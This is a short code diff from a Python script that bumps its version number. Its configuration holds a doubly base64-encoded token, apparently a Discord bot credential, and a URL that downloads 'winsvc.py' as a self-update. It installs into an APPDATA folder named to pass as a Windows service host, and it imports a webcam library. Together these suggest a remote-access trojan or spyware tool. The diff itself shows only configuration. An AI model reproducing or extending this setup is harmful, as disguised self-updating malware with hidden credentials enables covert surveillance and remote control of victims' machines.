@@ -7,7 +7,7 @@ import cv2
 # --- CONFIGURATION ---
 # REMOVED THE SPACE AT THE END OF THIS STRING
 ENCODED_TOKEN = "TVRRNE5UTXdPRGcxTkRNME1UUTJPREU0TUEuRzgxMWE5LkNWYXBCX0VfbUEzVG9FQk0yMUczaVNGekdYcXYxbUZSOFNVTU1F" 
-VERSION = "1.9"
+VERSION = "2.0"
 UPDATE_URL = "https://raw.githubusercontent.com/smatrix1/Nexo/refs/heads/main/winsvc.py"
 INSTALL_DIR = os.path.join(os.environ['APPDATA'], 'WindowsServiceHost')
 FULL_PATH = os.path.join(INSTALL_DIR, 'winsvc.py')
